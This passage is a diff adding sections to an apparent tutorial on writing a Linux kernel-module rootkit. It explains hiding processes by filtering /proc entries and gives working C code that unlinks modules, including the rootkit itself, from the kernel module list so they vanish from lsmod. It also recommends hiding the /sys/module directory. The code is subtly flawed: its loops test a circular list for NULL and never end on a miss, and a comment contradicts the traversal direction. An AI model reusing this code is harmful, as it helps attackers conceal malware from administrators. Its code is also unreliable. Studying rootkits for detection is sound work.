@@ -563,6 +563,139 @@ The *hack_ioctl()* function will be frequently modified due to new functions add
 
 
 
+## 4. hide process
+
+​	When we use the bash command *ps* to inspect the processes running on the OS, it simply read the entries under the */proc* directory. Each process will have a directory named after its pid under the */proc* directory, describing system-related information of it(e.g. the memory map of the process).
+
+​	So hiding a process is exactly like hiding a file. When *ps* calles *getdent()* to read entris under */proc*, we compare the directory name with the pid we want to hide.  There is nothing more we need to implement
+
+
+
+## 5. hide modules
+
+​	When we load a module into the kernel, a *module* struct is allocated to describe the module
+
+```c
+struct module {
+	enum module_state state;
+
+	/* Member of list of modules */
+	struct list_head list;
+
+	/* Unique handle for this module */
+	char name[MODULE_NAME_LEN];
+
+	/* Sysfs stuff. */
+	struct module_kobject mkobj;
+	struct module_attribute *modinfo_attrs;
+	const char *version;
+	const char *srcversion;
+	struct kobject *holders_dir;
+
+	/* Exported symbols */
+	const struct kernel_symbol *syms;
+	const s32 *crcs;
+	unsigned int num_syms;
+    
+    .....
+        
+}
+```
+
+
+
+​	All modules in kernel is linked by the *list* field to form a single-linked list. When we show the modules in the kernel by bash command *lsmod*, it first read a special file named */proc/modules* to get a list of module name loaded into the kernel, then it traverses the */sys/module* directory to get the detial information for each of them.	 <img src="./pic/2021-10-18_00-25-44.png" alt="2021-10-18_00-25-44" style="zoom:80%;" />
+
+
+
+<img src="./pic/2021-10-18_00-27-00.png" alt="2021-10-18_00-27-00" style="zoom:80%;" />
+
+
+
+> The file */proc/modules* should have a special *file_operations* whose *read*  will traverse the single-linked list of the modules and return the name and some basic information. But I didn't find the implementatino of this file when writing this post : (
+
+
+
+​	So to hide a module is simple: we remove the module we want to hide from the single-linked list. The single-linked list is implemented based on *struct list_head* whose definition is under *include/types.h*. And Linux kernel provides us a punch of functions to manipulate the linked list in *include/list.h* (e.g. *list_del*, *list_add*, ..). The implementation is as follows
+
+```c
+static int hide_self(void){
+    if(rootkit_cloaked) return 1;   // never cloak the rootkit twice!
+    prev_mod = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    rootkit_cloaked = 1;
+    return 1;
+}
+
+static int show_self(void){
+    if(!rootkit_cloaked) return 1;  // never uncloak the rootkit twice!
+    list_add(&THIS_MODULE->list, prev_mod);
+    rootkit_cloaked = 0;
+    return 1;
+}
+
+static int hide_module_name(char* name){
+    int i;
+    struct list_head* lh_p;
+    struct module* mod_p;
+    for(i=0;i<MAX_CLOAK_MOD_COUNT;i++){ // find a empty entry for the new hide request
+        if(cloak_mod_ent_array[i].prev_mod == NULL) break;
+    }
+    if(cloak_mod_ent_array[i].prev_mod && i==MAX_CLOAK_MOD_COUNT-1) return -1;  // too many module to hide
+
+    // find the module
+    for(lh_p=&THIS_MODULE->list;lh_p!=NULL;){    // travese backward first
+        mod_p = list_entry(lh_p, struct module, list);
+        if(!strcmp(mod_p->name, name)){ // found!
+            goto out;
+        }
+        lh_p = mod_p->list.next;
+    }
+    for(lh_p=&THIS_MODULE->list;lh_p!=NULL;){
+        mod_p = list_entry(lh_p, struct module, list);
+        if(!strcmp(mod_p->name, name)){
+            goto out;
+        }
+        lh_p = mod_p->list.prev;
+    }
+    return -2; // not found
+
+out:
+    cloak_mod_ent_array[i].prev_mod = mod_p->list.prev;
+    strcpy(cloak_mod_ent_array[i].name_buf, mod_p->name);
+    list_del(&mod_p->list);
+    return 1;
+}
+
+```
+
+​	We should keep the previous module of the module we hide, to add it back to the module list.
+
+​	*THIS_MODULE* macro gives us the pointer to current module's *module* struct. We start our traverse here to find the module we want to hide. Also, there are also some auxilary data structure to help *hide_module_name()*, similar to the ones in hiding a file
+
+```c
+struct cloak_mod_cmd{
+    char name[MAX_CLOAK_MOD_NAME_LEN];
+};
+
+struct cloak_mod_ent{
+    struct list_head* prev_mod;
+    char name_buf[MAX_CLOAK_MOD_NAME_LEN];
+};
+
+static struct list_head* prev_mod;  // previous module of rootkit
+static struct cloak_mod_ent cloak_mod_ent_array[MAX_CLOAK_MOD_COUNT];
+
+```
+
+
+
+​	After we hiding a module, the read to */proc/modules* will no longer return the module's information. But there is still detail information stored in the */sys/modules/* directories for the cloaked module. It is a good idea to add the directory name(the rootkits's name) to the cloak file array to make it totally invisible.
+
+
+
+
+
 # Reference
 
 1. [(nearly) Complete Linux Loadable Kernel Modules](http://www.ouah.org/LKM_HACKING.html#I.3.)
